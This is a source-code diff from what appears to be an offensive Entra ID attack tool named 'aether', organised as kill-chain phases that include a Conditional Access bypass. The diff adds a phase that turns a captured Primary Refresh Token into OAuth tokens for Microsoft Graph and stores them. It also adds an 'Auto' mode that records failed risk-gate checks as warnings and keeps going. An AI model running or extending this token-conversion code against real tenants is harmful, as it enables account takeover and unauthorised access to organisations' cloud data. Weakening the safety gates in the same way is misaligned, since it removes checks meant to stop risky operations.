@@ -7,8 +7,11 @@ import (
 	"time"
 
 	"github.com/Debajyoti0-0/aether/internal/engine/cap"
+	"github.com/Debajyoti0-0/aether/internal/engine/token"
 	"github.com/Debajyoti0-0/aether/internal/engine/validate"
+	"github.com/Debajyoti0-0/aether/internal/protocol/msoapx"
 	"github.com/Debajyoti0-0/aether/internal/transport"
+	"github.com/Debajyoti0-0/aether/internal/types"
 	"github.com/Debajyoti0-0/aether/internal/workspace"
 )
 
@@ -29,6 +32,11 @@ type Orchestrator struct {
 	PRTFile      string
 	PoliciesFile string
 	PathFile     string
+	// Auto continues past risk-gate failures (recorded as warnings)
+	// and uses the workspace-stored PRT instead of requiring --prt-file.
+	Auto bool
+	// STSBase overrides the Entra token endpoint (tests).
+	STSBase string
 }
 
 // PhaseResult is the outcome of one kill-chain phase.
@@ -53,6 +61,9 @@ func (o *Orchestrator) Run(ctx context.Context) ([]PhaseResult, error) {
 
 	// Phase: CAP bypass strategy.
 	results = append(results, o.runPhase(ctx, PhaseBypass, o.phaseBypass))
+
+	// Phase: PRT → OAuth conversion (auto mode uses the stored PRT).
+	results = append(results, o.runPhase(ctx, PhaseConvert, o.phaseConvert))
 
 	// Phase: path validation.
 	results = append(results, o.runPhase(ctx, PhaseValidate, o.phaseValidate))
@@ -79,10 +90,58 @@ func (o *Orchestrator) runPhase(ctx context.Context, name string, fn func(contex
 	res.Output = output
 	res.Signals = signals
 	res.OK = err == nil
-	if err != nil && !res.Skipped {
-		res.Output = strings.TrimSpace(output + "\nerror: " + err.Error())
+	if err != nil {
+		if o.Auto {
+			// Auto mode: gate failures become recorded warnings, not stops.
+			res.Output = strings.TrimSpace(output + "\nwarning (auto-continue): " + err.Error())
+			res.OK = true
+		} else {
+			res.Output = strings.TrimSpace(output + "\nerror: " + err.Error())
+		}
 	}
 	return res
+}
+
+// phaseConvert converts the workspace-stored PRT (or --prt-file) to
+// OAuth tokens and stores them back into the workspace.
+func (o *Orchestrator) phaseConvert(ctx context.Context) (string, []string, error) {
+	var prt *types.PRT
+
+	if o.PRTFile != "" {
+		loaded, err := token.LoadPRT(o.PRTFile)
+		if err != nil {
+			return "", nil, err
+		}
+		prt = loaded
+	} else if o.Auto {
+		if err := o.WS.LoadRecord(workspace.BucketTokens, "prt", &prt); err != nil {
+			return "", nil, fmt.Errorf("no --prt-file and no stored PRT in workspace: %w", err)
+		}
+	} else {
+		return "", nil, nil // skipped
+	}
+
+	client, err := msoapx.NewClient("chrome", 30*time.Second)
+	if err != nil {
+		return "", nil, err
+	}
+	if o.STSBase != "" {
+		client.BaseURL = o.STSBase
+	}
+
+	converter := token.NewPRTConverter(client)
+	tokens, err := converter.ConvertPRTToOAuth(ctx, prt, token.DefaultClientID, "https://graph.microsoft.com/.default")
+	if err != nil {
+		return "", nil, err
+	}
+
+	if err := o.WS.SaveRecord(workspace.BucketTokens, "oauth", tokens); err != nil {
+		return "", nil, err
+	}
+	if err := o.WS.LogEvent("prt_converted", fmt.Sprintf("tenant=%s token_bytes=%d", prt.TenantID, len(tokens.AccessToken))); err != nil {
+		return "", nil, err
+	}
+	return fmt.Sprintf("PRT converted for tenant %s; %d-byte token stored in workspace", prt.TenantID, len(tokens.AccessToken)), nil, nil
 }
 
 func (o *Orchestrator) phaseBypass(ctx context.Context) (string, []string, error) {
